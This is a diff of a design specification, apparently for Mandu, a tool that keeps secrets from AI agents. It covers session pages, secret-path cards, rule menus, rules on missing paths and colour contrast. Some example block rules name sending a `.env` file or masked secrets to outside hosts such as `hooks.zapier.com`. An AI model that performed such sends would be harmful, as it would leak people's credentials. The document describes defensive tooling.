+  keyed on the registry's files too), so a row and its page agree. "Output
+  of an `exec` step" takes "an".
+- **The step says it too.** A step whose result held secrets all kept in
+  one registered file says so: "The result held your secret
+  `ORDERHUB_PASSPHRASE` from `~/app/.env`." (`ItemLabel.file`).
+- **The path.** A card whose first line says the AI got the masked version
+  (`saw` `masked` or `own-model`) draws *Where it went*, one row a fact,
+  each marked by where the real value is: *on your computer*, *at the AI*
+  (the AI's rows set one step in, behind the wall, a masked version only)
+  or *off your computer* (2026-10-30, below): **Kept in** (its file), **How it came in** (the
+  first step whose result held it, in the step's own sentence, its time
+  opening the step), **The AI got** ("its masked version, in 5 requests"),
+  **The AI used the masked version** (the lineage's `echoed` edges, when the
+  AI wrote it into a call), then where it went: **Sent with its real value
+  to** each host, **Stopped on its way to** each host, **Stopped** actions,
+  **Waiting for your OK**, and, only where the card's lines say Mandu filled
+  it in nowhere, **Left this computer: never with its real value**. Each
+  node is read from the edges and events the lines read, so the path never
+  says more than they do (`pathOf`). The page's own step sentences come from
+  `pageSecrets`, so Home's call and the page's say the same.
+- **A send is off your computer (2026-10-30).** **Sent with its real value
+  to** was captioned *on your computer*, right beside the host the real
+  value went to, while the card's own line said "Mandu sent its real value
+  only to `api.stripe.com`". Its node now has its own side
+  (`SecretPathNode.side` `off`), captioned *off your computer*: the real
+  value left this computer for that host. Every other row about this
+  computer (**Kept in**, **How it came in**, **Stopped on its way to**,
+  **Stopped**, **Waiting for your OK**, **Left this computer**) stays *on
+  your computer*, since each says the value was held here; the sent row
+  keeps the computer rows' indent and grey dot. A side the page does not
+  know is drawn as *on your computer*, as before.
+- **An earlier leak.** When the last scan the launcher kept (§4.25ai) found
+  the same file's same key reached an AI in a session without Mandu, the
+  card says so in red under its path: "Without Mandu, OpenClaw gave the AI
+  its real value on Oct 27, 09:37: `DEBUG=1 sh orders-app/bin/sync-orders.sh`
+  printed it. `mandu scan` found it in 1 session without Mandu; the AI's
+  provider still has it, so change it where it was issued." with *See it in
+  Scan*, which since 2026-10-29 opens that finding's row at *Where the real
+  value is now* (`/scan?item=f3`, `scanItem`; §4.25ai). Another key,
+  another file, or sessions all under Mandu say nothing (`earlierLeak`).
+  The scan's own masked command and its times, never a value.
+- **An unchecked record's path.** Under a record Mandu could not check, the
+  cards and tiles stay as §4.25ah has them (none counted). Below them,
+  **What this session's record says** lists each secret the whole record
+  tells of that no card does (`SecretsStory.recorded`), tagged *Unchecked
+  record*, with its file, its path and any earlier leak, and no line, count
+  or *Show the real value*: "Mandu could not check these events, so this is
+  what the record says happened, not what Mandu can vouch for." Its path
+  never has the "never with its real value" node, since a claimed event may
+  not make the claim that a value stayed (arbiter-human-plane.md §10.2).
+
+The developer view shows the same facts in *Where each went*
+(symbol-lineage.md §5.6). Words: "masked version", never "placeholder"
+(§4.25u). Tests: `secret-path.test.ts` (naming with and without the
+registry, the step's file, the path, the earlier leak and what does not
+match, the unchecked record, no value or token), `label-times.test.ts`
+(one registry read), `home-js-agent-path.test.ts` (the drawn path, the
+earlier line and Scan link, the unchecked block), `agent-page.test.ts`
+(Home's call and the page's agree), `session-page-record.test.ts` (a path's
+time opens its step), and over the real arbiter, anthropic-proxy and
+dashboard, `tests/stack/session-lineage.test.ts`; over the real net-proxy,
+`tests/stack/session-page-issuer-send.test.ts` (the served page captions a
+send *off your computer*, its later stop *on your computer*).
+
+**Newer and older sessions (2026-11-02).** To read several sessions in a
+row (last night's runs, say), a person opened one from History, read it,
+pressed *Back to History*, found the next row and opened it: the page had no
+way to the session before or after it, and it ends with the last turn of
+*What happened*, far from its back link. Now a line under *What happened*
+(`<nav id="agent-neighbours" aria-label="Other sessions">`) has up to two
+links: **Newer** to the session History lists just above this one, **Older**
+to the one just below, each named as its History row, by the agent, what
+you asked (no words for a fallback label, `promptLabel`) and the time of its
+last moment: "← Newer: Claude Code · Fix the login test · 14:05", "Older:
+Codex · What is in .env? · yesterday 22:10 →" ("14:05" today, "yesterday
+22:10", else "Sep 30, 14:12"; the full clock time on hover). The newest
+session has no Newer and the oldest no Older; a session History does not
+list (a drill or test run, opened from an ask) and a page that could not be
+read show neither, and the line is hidden. The line is not printed (*A
+printed session is whole*: a printed or saved session ends with its last
+turn, since 2026-11-04, #293).
+
+The order is History's **full** list, newest first by last moment
+(`buildAgentPageFor` reads the `sections.live` list `buildHistoryFor` reads;
+`sessionNeighbours` in home.ts finds this session in it): History's *Find a
+session*, *Only sessions where Mandu stepped in* and *Go to a day* do not
+apply, so a person who filtered History and opened a row steps to the
+sessions around it in time, not to the next one their filter kept. The
+links are worked out at each read of the page, so a running session's moving
+place follows it; no fact is counted for them and nothing more is read.
+Each is an ordinary page change (`data-page-link="agent"` with
+`data-session`, as a History row's link): Back returns to the session you
+left, a middle click opens a new tab, and the session opened this way keeps
+the back link of the page the chain of sessions started from: opened from
+History, then Older twice, it still reads **Back to History** and a click
+returns there as three Backs would (since 2026-11-03, #291; *A chain of
+session pages keeps where it started*, §4.25ad). Metadata only: agent names, prompt
+labels and times, which `/api/home/history` already serves to a signed-out
+reader; never an event payload or a value. A poll that brings the same
+neighbours leaves the links in place, so a focused one keeps its focus.
+Tests: `session-neighbours.test.ts` (the pure lookup),
+`home-js-agent-neighbours.test.ts` (both, one, none, a page not read, the
+words and a click), the component `agent-page-neighbours.test.ts`
+(History's order cross-checked against `/api/home/history`, a drill run, a
+fallback label), and over the real arbiter `tests/stack/agent-neighbours.test.ts`
+(secrets axes: the older session's page links the newer, a click opens it,
+no secret value in either payload; opened from History, Older, then *Back to
+History* lands on History with the row opened focused).
+
 #### 4.25c Rules page: every button acts in place
 
 **Design.** A row is what the rule covers, ONE effect, and a ⋯; nothing on
@@ -11785,13 +15737,43 @@ to follow: a fourth column of counts, two buttons and links on every row).
 A row (`ruleRow`) shows the subject, its reach under it, and the effect: a
 menu (`effect-select`, the effect in force and the one it can turn into,
 *Always allowed* / *Always blocked*) where the rule has a flip, else the
-effect in words. The ⋯ (`file-more`) opens `ruleDetail` under the row: the
+effect in words. An answer the arbiter keeps for one session or one use
+says so instead (*Allowed for this session*, *Allowed once*, and the notice
+after the flip, 2026-10-31: §4.25 *Kept for one session or one use*). The ⋯ (`file-more`) opens `ruleDetail` under the row: the
 answer's when-and-where line (§4.25h), the origin line (§4.25i), the use
 count or "Your answer, asked N times", where it is kept, Show in policy.yaml
 (§4.25g), Show in the file browser, and **Remove** (or "Set in the rules
 file"). A failed flip shows the server's words on the row and the menu goes
 back to the effect in force. The bullets below stand, with "a button" read as
 the menu or the ⋯'s Remove.
+
+**A menu that saves at once waits for Enter from the keyboard** (2026-10-23).
+Your rules' effect menu and a Settings › Prompt filters kind's action
+(§4.25y) save the moment their value changes. On Linux and Windows,
+Chromium (and Firefox) picks the next option on an arrow key on a closed
+`<select>` and fires `change` at once. Only macOS opens the list. Until this
+date one Down arrow on a past answer's *Always blocked* posted
+`egress/approvals/<id>/approve` with no question. Arrowing from *Hide it*
+to *Just note it* saved three changes on the way, and each save turned the
+menu off under the next key. Now `home.js deliberateMenu` marks a `change`
+that follows a browsing key: an arrow, Home, End, Page Up or Down, or a
+typed letter with no Ctrl, Alt or Meta. Such a `change` saves nothing. The
+menu shows the new choice, and a line under the row (`.menu-wait`,
+`role="status"`, the menu's `aria-describedby`) says "Press Enter to change
+it to Always blocked, or Escape to keep Always allowed." **Enter** saves it,
+the same code a click runs. **Escape**, or leaving the menu, puts back the
+choice in force, and nothing is sent. A pick with the pointer, or from the
+opened list, saves at once as before: a pointer press and any other key
+(Alt+Down, F4, Space, Enter) clear the mark. A wrong mark only asks for an
+Enter; it never saves a choice that was not made. A choice that waits is
+kept by its row's key with the choice in force it was made against. So a
+list drawn again meanwhile (the find box, an answer elsewhere) shows it
+again, and the line still comes under the row. Nothing else changes: the
+request, the loosening question, the focus after a save, the notice and its
+Undo. Tests: UI `home-js-menu-keys`; stack `rules-change-focus` (F7, over a
+real arbiter: an arrow alone leaves the rule allowing and the answer's send
+blocked) and `dashboard-prompt-settings` (the kind's choice made with the
+keyboard).
 
 **2026-10-08: the subject's chip fits it.** The subject is a `code` chip at
 the top of `.rule-text`, a flex column, and a flex column stretches its
@@ -11996,6 +15978,28 @@ grammar; `home-js-rules.test.ts` the rendered row and confirmation.
   `RULE_GROUPS[].about`). *Sending data*: where data may go; the default is to
   ask; a rule covers any masked data (from one source or anywhere), an answer
   only the one piece you were asked about.
+  - **The line is true of every row under it, the blocking ones too**
+    (2026-10-28). Two lines said only what is let through, while their
+    groups also hold rows drawn red (`ruleTone`, and a past answer Block):
+    "where masked data and secrets may go without asking you" sat over
+    "`hooks.zapier.com` · sending only the file `~/mandu-try/.env` · Always
+    blocked", and "programs whose output the AI may read, and connections
+    the agent may open" over a built-in protection set to Block
+    (`disposition`) and a past answer blocking a command (`where: exec`),
+    neither a program nor a connection. Now *Sending data* reads "where
+    masked data and secrets may go, or are blocked from going, without
+    asking you" and *Programs and connections* "programs whose output the AI
+    may read, connections the agent may open, and commands and checks you
+    allow or block" (a built-in check is one you set to Block; "built-in"
+    is left out so the line stays one line in the 894 px column at 1280 px,
+    880 px measured in Chromium). *Your answers about files* ("what you
+    answered …") and *Trusted sources* name no effect that a blocking row
+    could contradict, so they are unchanged. Presentation only: no row,
+    group, route, rule or menu changes. `home-js-rules-send.test.ts`
+    S10–S12 (S12: with a row of every rule kind and answer family, no row
+    drawn red sits under a line that says only what may go through) and
+    `tests/stack/rules-send-names.test.ts` S5 (the served line over the real
+    arbiter's Block answer).
 - **An answer names its data.** A verdict is keyed symbol × destination, so it
   covers ONE piece of data going to that host; a row reading "`host` · Always
   allowed" would overstate it. Several placeholders of one registered file
@@ -12013,9 +16017,50 @@ grammar; `home-js-rules.test.ts` the rendered row and confirmation.
   "sending only the output of "cat x"", or, with no source, "sending only the
   data you were asked about". Long paths keep their last three parts, the full
   target in the tooltip. The file, the address and the command are drawn as
-  code (2026-10-16, §4.25u *Rules names what a send covers*).
+  code (2026-10-16, §4.25u *Rules names what a send covers*). A file's own
+  row under *Files and folders* names the same answers under its *Where it
+  may be sent* menu (2026-10-30, §4.25n *A file's row names your answers
+  about it*).
 - **Send rules say "any"** ("sending any masked data [from X]"), so a rule and
   an answer read as the contrast they are.
+- **A send rule says when the mode leaves it nothing to decide**
+  (2026-10-30). The egress gate asks a rule for a host (a `user_rules`
+  entry of kind `release`: allow, block or audit) only about a symbol that
+  is not a secret: with confidentiality on, a secret keeps the
+  bound-destination path, and the block rule is skipped as well as the
+  allow (`arbiter/ipc/server.ts`, the user-rule branch, `!(this.confidentiality
+  && secret)`; pinned by `arbiter/test/unit/user-rules-gate.test.ts`, "a
+  SECRET symbol never yields to a user allow rule"). In the Secrets mode
+  (confidentiality on, integrity off) untrusted content is not masked, and
+  a prompt-filter mask is minted at a secret level (a pack's `level:` is
+  `any-model`, `local-model` or `no-model`, `packs.ts`, never `public`), so
+  no masked value exists that such a rule could decide for. Yet the row read
+  "`paste.example` · sending any masked data · Always blocked" with a red
+  dot. Now, while the Rules load's `config/axes` says
+  `effective.confidentiality && !effective.integrity` (`home.js`
+  `sendRuleIdle`), each such row in force (not an expired one, which already
+  reads "Expired, no longer used") has a muted line under its reach, and the
+  same line in its opened row: "Decides nothing in the Secrets mode: a rule
+  for a host never covers your secrets, and this mode masks only secrets."
+  Its menu's dot is grey, as an expired or off rule's. The words say
+  nothing of where a secret goes instead (its file's hosts, your answers,
+  the issuer bindings). Unchanged: the menu (Always allowed ↔ Always
+  blocked), Remove, Undo, Find a rule (the line is not among a row's find
+  words), the rule itself, which decides again in a mode with the integrity
+  axis on; Approvals answers (keyed on the secret, they do decide),
+  connection rules, file rules, Trusted sources and Check a host; and every
+  other mode or unread axes (off has its own line, `renderRulesOff`).
+  Describe what you want's card draws the same line on a suggested send
+  rule before Apply (2026-11-02, *A suggested send rule says when the mode
+  leaves it nothing to decide*).
+  Presentation only: no arbiter call, route or policy change.
+  `home-js-rules.test.ts` (the Secrets mode, full, unread and off; the
+  opened row; the menu still posts `policy/rules/change`),
+  `tests/stack/rules-send-rule-mode.test.ts` (the served line over the real
+  arbiter, whose gate decides the key's send to the blocked host by
+  `egress:secret-*`, never `egress:user-rule-block`) and
+  `tests/stack/rules-send-names.test.ts` S4 (these axes: the rules grey, the
+  Block answer red).
 - **A send rule with an end says when** (2026-10-23, §4.25u *A rule with an
   end date says when*): an allow or block rule whose `expires` is still to
   come reads "Always allowed" (or "Always blocked") with "until Dec 1,
@@ -12121,6 +16166,111 @@ saves from the scan all read that way.
   look did not answer the word its label says. Words only: no route, field
   or label changed.
 
+**A rule on nothing says so (2026-10-27).** A rule on `~/shop/.evn` (a
+typo for `.env`), on a project folder that was moved, or on a path a
+helper guessed wrong was drawn like a rule that protects something: an
+icon, its level and its hosts, so the person read "No AI" beside the name
+and took the file for protected while the real one sat beside it. Add a
+rule's "Not there yet" (§4.25p) was gone once the rule was saved, and rules
+made elsewhere (policy.yaml, Describe's Apply, *Always*, an agent's rule
+change, *Keys Mandu found*) never had it. A rule made on this page (Add a
+rule, "Saved by Mandu, not in policy.yaml") had it from 2026-10-27 too, see
+the last bullet: the common case there is a move, a project moved or
+deleted after its `.env` was made "No AI".
+
+- **The same look also finds what is missing** (`server/path-kinds.ts
+  pathKinds → { files, missing }`; `filePaths` is its `files` half, for
+  the other callers). `loadPolicyPanel` looks at every literal absolute
+  rule path, not only the ones reaching everything inside, and passes both
+  sets; `policy-panel.ts` gives a lock row whose path is missing
+  `missing: true`, and changes nothing else on it.
+- **Only "nothing here" counts.** A stat failing with `ENOENT`, or
+  `ENOTDIR` (a parent that is a file), is missing. A path that cannot be
+  read (`EACCES`, `EIO`, …), a pattern, a relative path, or a stat not
+  answered within the 500 ms bound (a hung mount) is not: the page never
+  says "nothing here" about what it could not look at. A drive that is
+  unmounted reads as missing, which is true then, and the words say "on
+  this computer" and "applies if something appears".
+- **The row says it** (`home.js ruleTreeRow`): one dim line
+  under the name, first where *Opens it* goes, "Nothing at this path on
+  this computer. The rule applies if something appears here; if you meant
+  another file, check the spelling.", the plain file icon (a missing path
+  is not known to be a folder), and the opened row says the same in place
+  of the folder note. A pattern never gets it.
+- **Two summaries say it where the row cannot be seen** (2026-10-27). The
+  row's line was said "once, quietly", and two things hid it: a folder
+  folded under *Your rules* (`F.folded`, kept across every redraw) draws
+  none of its rows, its head saying only "3 rules"; and *Find a rule* does
+  not search the line, so in a long list the only way to spot a typo was
+  to read every row. A typo there means the file the person meant is not
+  protected the way they think.
+  - *A folder's head counts them*: a folder with a rule on nothing at any
+    depth inside reads "3 rules, 1 on a path where nothing is", folded or
+    open, in the same dim words (`fileTree`'s `missing` beside `count`).
+    While *Find a rule* has text it counts what the box found, as its
+    `count` does. A pattern is never counted (`ruleMissing`).
+  - *The Files and folders heading names them* (`renderFilesMissing`,
+    `#files-missing`, outside the list): one dim line, "1 rule names a path
+    where nothing is on this computer:" then each path (`shortPath`, one
+    button a path, up to 3) as a link button, past 3 "and N more, each
+    marked below". A press is `openRuleRow`, the jump of *Who may get your
+    secrets*: it unfolds the folders above the rule, empties a *Find a
+    rule* text that would hide it, opens the row and puts the focus on its
+    ⋯ (a path two sources name opens the first, policy.yaml's). It counts
+    every rule, not only those found, so it does not come and go with the
+    box; it is hidden with the group when the box finds none of its rules,
+    when Rules could not be read, and with no rule on nothing. *Find a
+    rule* still does not search the words; this line is how to find them.
+  - Neither is a warning: no colour, no icon, and "on this computer" with
+    the row's "applies if something appears here", since a rule made ahead
+    of the file it names is fine. Both read only the `missing` flag already
+    on the rules, so there is no new server read, and they show paths,
+    never a value.
+- **The rule is unchanged.** Its words keep its reach ("and everything
+  inside"), and `ruleShape` keeps its kind, so a change made on the row is
+  saved with the entry's reach and the rule that decides a path is found as
+  before; it is counted, listed and found by *Find a rule* as before (the
+  line is not among the words it searches). The next read of Rules after
+  something appears at the path drops the line.
+- **A rule made on this page says so the same way** (2026-10-27).
+  `/api/secrets` (`getSecrets`) uses the same `pathKinds` look over every
+  literal absolute label path, exact or recursive (it looked only at the
+  recursive ones, for *A rule on a file reads as a file*), with the same
+  500 ms bound and the same "only nothing here counts". `toLabelRow` gives
+  a label whose path is missing `missing: true` (never a pattern;
+  `pathIsFile` stays for recursive labels only), and `home.js` carries it
+  onto the page-made row, so it draws the line, the file icon and the
+  opened row's sentence as above. Its level, hosts, menu, Remove and how a
+  change to it is saved are unchanged.
+- **Who may get your secrets says it too** (2026-10-28): its lists and
+  *Check a host* write "(nothing at this path)" after such a rule's file,
+  from the same flag (§4.25aa *A rule on nothing says so here too*).
+
+**A rule finds its sessions (2026-11-04, queue #250).** History's *Find a
+session* finds the sessions where a secret came up by its card's name or
+its file (§4.25ae *By a secret or a host*), but an opened rule on Rules,
+where a person looks at one file, had no way there: "which of my sessions
+touched this file?" meant opening History and typing the path. Now the
+link line of an opened rule on a path (a file, a folder, or a path with
+nothing there; the line of *Show in policy.yaml* and *Show in its folder*)
+ends with **Its sessions on History**, named by its row ("Its sessions on
+History: ~/proj/.env"). It is a plain link to `/history?q=<path>`, the
+path as the row names it (`~/…` under the home folder, `shortPath`), the
+words a secret card's name holds; its `data-land` "q:<words>" opens
+History with the box filled and the list searched (`setPage`, as a Plugins
+card's link does, §4.25aj), and Back returns to Rules where you were. A
+pattern rule (`**/.env`) has none: the search matches words, not globs.
+The words say "its sessions", not "every session": the search matches
+words, so `~/app/.env` also finds a session with `~/app/.env.local`, and a
+folder's path finds the sessions with a file in it; a session from before
+the rule, whose cards name nothing of the file, is not found. `home.js
+historySearchLink` (shared with the session page's card, §4.25b *A card
+finds its other sessions*). Presentation only: no route, policy or search
+changes. Tests: jsdom `home-js-file-rule.test.ts` (the link, its address,
+`data-land` and name on a file, a folder and a rule on nothing; none on a
+pattern; a click opens History searched), and stack
+`tests/stack/rule-its-sessions.test.ts`.
+
 **The tree is as long as its rules (2026-10-14).** The tree (`#files-tree`)
 wore `files-list`, the file browser's class, from the days the two shared
 one explorer box (§4.25n): `max-height: min(60vh, 560px); overflow-y: auto`.
@@ -12195,7 +16345,9 @@ typing keeps only the rows whose **drawn words** hold the text,
 case-insensitive (`home.js` `ruleWords` / `ruleMatches`):
 
 - a file or folder of the tree by its path as drawn (`~/…`, and in full, as
-  its tooltip shows it), its reach, its label, its *Opens it* line and the
+  its tooltip shows it), its reach, its label, its *Opens it* line where
+  the row draws one (a rule that names programs, §4.25p; a default row's
+  undrawn words never match, so "masked" does not find every file) and the
   hosts it may be sent to (per value, with the value's name);
 - any other row (*Sending data*, *Programs and connections*, *Trusted
   sources*, *Your answers about files*) by what it covers (a host, a
@@ -12208,14 +16360,72 @@ open; a folder rule kept only as the way there is drawn but not counted.
 Folding a folder while the box holds text changes only what is drawn, so
 emptying the box gives back the person's own folds (`F.folded`). A group
 with no match is not drawn, its title (and the tree's column heads) with
-it. The count reads "3 of 27"; nothing found says "No rule mentions
+it. The column heads are drawn only over a rule row: not over "No file or
+folder has a rule of yours yet." nor over "Your rules could not be read."
+(`showFilesGroup`'s `rows`), as the browser's own heads (§4.25p). The count reads "3 of 27"; nothing found says "No rule mentions
 “stripe”." with *Clear*, and, when the text looks like a path, a line
 offering *Add a rule*, which opens the browser with a full path or pattern
 already in its path box. Escape empties the box (an empty box leaves Escape
-alone).
+alone). A `/` typed anywhere else on Rules puts the cursor in it (§4.25 *`/`
+finds*).
 
-- **Presentation only.** No read and no server change: it narrows what the
-  page already drew. It matches only the words a row draws, never the raw
+*An empty Your rules has nothing to find* (2026-10-28, #141). A new
+install's Rules drew the box in the card's head over an empty list, where
+typing could only answer "No rule mentions …", and while the rules were
+unread it did nothing at all. Now, as History does (*An empty History has
+nothing to find*), `rulesFindShown` hides `#rules-find` (`hidden`, not
+removed; `.rules-find[hidden]` is `display: none`) while the rules were read
+and there is no row of any kind (`rows.length === 0` in `renderRules`: no
+file rule, send rule, answer or other row), and while Your rules could not
+be read. *Add a rule* keeps its place at the right (the heading's
+`margin-right: auto`). It is shown again by the first read that brings a
+rule (a Save, an Undo, an Approvals answer `loadRules` reads again) on the
+same page, the focus left where it was. It is never hidden while it holds
+text or has the focus (#55's rule), so a person who emptied the list by
+Remove while finding keeps the box, its text and *Clear*; *Clear* gives the
+box the focus before it empties it, so it stays. Before the first read
+answers (`RULES_READ`) it is left as drawn, so it does not blink.
+
+**A path no rule names says what covers it (2026-10-27, #209).** People
+type a file's path to see what protects it, and a file covered by a folder
+rule, a pattern or a built-in protection has no row of its own: "No rule
+mentions" plus *Add a rule* read as "unprotected", and the rule it offered
+would be closer than the folder rule, so it would take over there. So when
+the box holds a **full path** (from `/` or `~`, with no `*`, `?` or `[`) and
+no row holds it, the page asks `GET /api/files/why` for it (the read the
+browser's opened row makes, §4.25m), once, 400 ms after typing stops
+(`FIND_WHY_DELAY`); an answer for text no longer in the box is dropped. The
+"No rule mentions" line stays, and the line under it says what `fileLabel`
+decided (`why.label.source`), "covers it", never "safe":
+
+| Source | The line |
+|---|---|
+| `inherited`, `yours` | "Your rule on `~/app` covers it: *No AI*. **Show that rule**" |
+| `pattern` | "It matches your rule `**/*.pem`: *No AI*. **Show that rule**" |
+| `builtin` | "Mandu keeps it secret without a rule (Built in: SSH keys): *No AI*. **See Built-in protections**" |
+| `written` | "Mandu keeps it secret because something holding a secret wrote it. **See Files made from your secrets**" |
+| `model-key` | "It is the key of a model in Settings › Models. **Open Settings › Models**" |
+| `none` | "No rule and no built-in protection covers it. To protect it, **add a rule**." |
+
+*Show that rule* puts the rule's path as drawn (`via`, `~/…`) in the box,
+Find runs again, and the rule's row opens with the folders above it
+unfolded (`openRuleRow`); it is offered only when that rule is a row of Your
+rules. The two *See* links and *Open Settings › Models* go to their cards as
+the section links do. A covered path keeps the offer after its line, "To
+give it a rule of its own, add a rule." (not for `yours`: it has one), and
+the browser's *What the rules say* and Save's warning do the rest. With
+protection off the line ends "Protection is off, so none of this is enforced
+now." (`whyPanel`'s words), so `none` never reads as a promise. While the
+read is out the line reads "Checking what covers it…"; a refused or failed
+read (signed out, 501, 503) leaves the plain lines with no error, so Find
+never looks broken. The lines are in `#rules-find-none` (`role=status`).
+Text that is not a full path (a host, a program, `stripe`, `.env`, a
+pattern) reads nothing.
+
+- **Presentation only.** No write and no server change: it narrows what the
+  page already drew, with one read, `files/why` (an existing admin read, its
+  answer paths, levels and hosts, never a value), for a full path no row
+  holds. It matches only the words a row draws, never the raw
   subject a row keeps for its tooltip, so a form the server holds back
   (a pattern hidden while signed out, `patternsHidden`) can never be found by
   its real text.
@@ -12236,13 +16446,24 @@ Tests: `home-js-rules-find.test.ts` (jsdom: each row kind, the `~/` form, an
 opened, a folded folder and the person's fold back, a group hidden, "N of
 M", the nothing-found line with *Clear* and *Add a rule*, Escape, a re-read
 after a change, *Changes to save* on a hidden row, a raw subject not found, a
-page change, the jump from *Who may get your secrets*), and the stack e2e
-`tests/stack/rules-find.test.ts` (a real arbiter with 27 rules, the
+page change, the jump from *Who may get your secrets*; a full path's line for
+each source and with protection off, *Show that rule*, one read for two quick
+edits, a stale answer dropped, a 401 or 503 leaving the plain lines, no read
+for text that is not a full path; #141: with no rule the heads and the box
+are hidden, unread too, one file rule shows both, a send rule alone shows
+the box but no heads, a box with text or the focus stays when the last rule
+goes, *Clear* keeps it, a re-read that brings the first rule shows it with
+the focus unmoved, and a draw before the first read leaves it), and the stack e2e
+`tests/stack/rules-find.test.ts` (a real arbiter with 28 rules, the
 production adapter and the served page: a host keeps its send rule and the
 two files that may go there, a program its file, a port its connection, no
-request made while typing; in a real headless Chromium at 1280 and 390 px,
-the box and the count fit the card, beside and under the heading; the
-oracle).
+request made while typing text that is not a full path; a file inside the
+folder rule `~/proj`, a built-in SSH key and a path under no rule each say
+what covers them, one `files/why` read each; in a real headless Chromium at
+1280 and 390 px, the box and the count fit the card, beside and under the
+heading; the oracle, the `files/why` answers included; #141: over an empty
+policy no heads and no box, then a file rule saved through the page's Add a
+rule and Save brings both, no value and no `$MDU:` on the page).
 
 #### 4.25g Rules page: "Show in policy.yaml" on each row
 
@@ -12364,6 +16585,21 @@ agent's `sessionKey`, and the items touched with their before/after values.
   which never names a person: plan 14 §14.14); "This came back when you undid a change";
   "… It was changed in policy.yaml after that." when not `current`; "No
   record of who added this."
+- **The line links its change** (2026-10-23): a recorded origin ends with
+  "See this change in Approvals" (after the agent's link, " · " between),
+  a plain link to `/approvals/<changeId>` (`ruleOrigins`' `changeId`, the
+  newest change's `pc-…` id), where that change's *Rule changes* row is
+  marked with its Undo (§4.25 *Details*), read further back when it is past
+  the rows drawn (§4.25 *Past the newest 20*). It is named by its rule
+  (`rowControlName`: "See this change in Approvals: b.example"). A file
+  rule's line then has **Find its changes** (" · " between), *Rule
+  changes* searched for its `~/…` path (§4.25 *Finding a rule change*), so
+  a file changed several times shows how it got where it is (2026-10-29);
+  a send rule to one host and a connection rule have it too, searched for
+  their host (2026-10-31).
+  "No record", and a row whose newest change removed it, link nothing. A change since
+  undone, or edited by hand after (`changedSince`), still links: its row
+  says "Undone", or has no Undo, as it does today.
 - **Who, in one place.** `changeWho` reads a change as agent / agent with your
   OK / a scan suggestion applied on the agent's channel (`scan-applied`:
   `agent-tighten`, or an older arbiter's `tighten` by `data-plane`, with
@@ -12373,6 +16609,11 @@ agent's `sessionKey`, and the items touched with their before/after values.
   (or the approver's name on an older arbiter); Approvals' history uses it
   too, and links the agent of an agent's row as this line does (§4.25 *A
   rule change and the agent that asked*).
+  A Settings change's Rule changes row names its card from the ops of its
+  edits (`settingsCard`): your models, your sensitivity labels, or your
+  prompt filters "in Settings"; with no edits, edits from more than one
+  card, or an op of none of them, "You changed a setting in Settings"
+  (2026-10-26: the rows used to call every Settings change "your models").
 - **The agent's session** is its scope id (`MANDU_SCOPE_ID`, the policy tool's
   session key), the id the proxy files its events under.
 
@@ -12381,10 +16622,14 @@ Mandu was not running (§4.25j).
 
 **Tests.** arbiter `policy-agent-ops.test.ts` (`panelRowIds`, `current`
 after a hand edit); `policy-proposals-view-model.test.ts` (`changeWho`,
-`ruleOrigins`); `rule-actions.test.ts`; `home-js-rules.test.ts`;
+`ruleOrigins`, its `changeId`); `rule-actions.test.ts`; `home-js-rules.test.ts`
+(the line, its change link); `home-js-rule-change-seek.test.ts`;
 `tests/stack/rule-origins.test.ts` (real arbiter + production adapter +
 dashboard: hand-written rows, an agent's approved request, an agent's
-tightening, a Rules page button, a later hand edit, the history).
+tightening, a Rules page button, a later hand edit, the history);
+`tests/stack/rule-origin-change-link.test.ts` (a file locked on the Rules
+page: its origin line's link opens Approvals with that change marked, its
+Undo there takes the rule out of the arbiter's panel; no value on a page).
 
 #### 4.25j Every write to policy.yaml is recorded
 
@@ -12496,7 +16741,8 @@ replaces §4.1's IDE palettes). Presentation only: no security surface.
 **Text on a filled color reads in both themes (2026-10-14).** The count of
 asks waiting in each page's top bar (the product page's `.count` beside
 Approvals, the inspector's `.area-badge` in its page row) was a fixed white
-on `--warn`: 5.09:1 on the light theme's amber `#a35d00`, but **2.23:1** on
+on `--warn`: 5.09:1 on the light theme's amber of then, `#a35d00` (5.68:1
+on `#985700` since 2026-10-25, below), but **2.23:1** on
 the dark theme's light amber `#e0a24a`, under WCAG AA's 4.5:1 for text and
 under the 3:1 floor for large text. This was the page's main "needs you"
 signal, on every page. A headless Chromium audit of every page of both
@@ -12531,6 +16777,7 @@ approved a palette change (nightly queue item #4):
 | `--ink-4` | light | `#8a8a92` (3.43 / 3.08 / 3.28 / 2.97) | `#6c6c74` | 5.20 / 4.68 / 4.98 / 4.51 |
 | `--ink-4` | dark | `#7c7b76` (3.80 / 4.18 / 3.98 / 3.29) | `#989791` | 5.50 / 6.06 / 5.76 / 4.77 |
 | `--ok` | light | `#1e7f4f` (4.16 on `--ok-bg`) | `#1b7448` | 4.81 on `--ok-bg`, 5.77 on white |
+| `--warn` | light | `#a35d00` (4.45 on `--warn-bg`; 5.09 / 4.58 / 4.88 / 4.42) | `#985700` | 5.68 / 5.11 / 5.44 / 4.93; 4.96 on `--warn-bg` |
 
 `--ink-3` stays where it was (6.83:1 light, 6.29:1 dark on the panel), so
 times and labels stay visibly fainter than notes; the page has a little
@@ -12543,20 +16790,110 @@ slightly. The inspector reads the same tokens from `mandu.css`, so its
 The rule: every text token reads at least 4.5:1 on every ground it is drawn
 on, in both themes.
 
-*Not covered* (one gap left, for the human): the light theme's `--warn` on
-`--warn-bg` (the secret chip `.mask-chip.secret`, the waiting and raw tags
-and turn summaries) reads **4.45:1**. `#985700` would read 4.96:1 (and
-white on it 5.68:1), but the top bar's count is pinned as "white on
-`#a35d00`, as before" by a stack test that an unattended change may not
-edit, so the token stays until the human moves it with that test.
+The `--warn` row came later (2026-10-25, nightly queue item #93). The
+light amber on its tint read **4.45:1**, just under 4.5:1: the secret
+chips (`.mask-chip.secret`), the "Masked only later" and "No AI since"
+tags (`.tag.raw`, `.tag.level.raw`), the waiting tags and the "The AI read
+your secret as it was" turn summaries (`.turn-summary.raw`), the page's
+most important warnings. On the session page of the first-session tour,
+11 elements read 4.45:1 in the light theme. The amber is a shade deeper
+now, everywhere it is drawn (words, dots, borders), and reads better on
+every ground. The top bar's Approvals count stays white on it, now
+5.68:1. The dark theme's `#e0a24a` is unchanged (6.00:1 on its tint).
+
+*Not covered*: none. Every text token reads at least 4.5:1 on its ground,
+in both themes.
 
 *Tests*: `dashboard/test/unit/ui/css-shared-system.test.ts` (the token
-table in both themes, the `--ink-3` / `--ink-4` order, the light `--warn`
-gap pinned at its value; every `app.css` rule whose `color` is
-`var(--ink-4)` reads ≥ 4.5:1 on its own background or on every plain
-ground), `dashboard/test/unit/ui/css-dim-ink.test.ts` (D3: a row's `.dim`
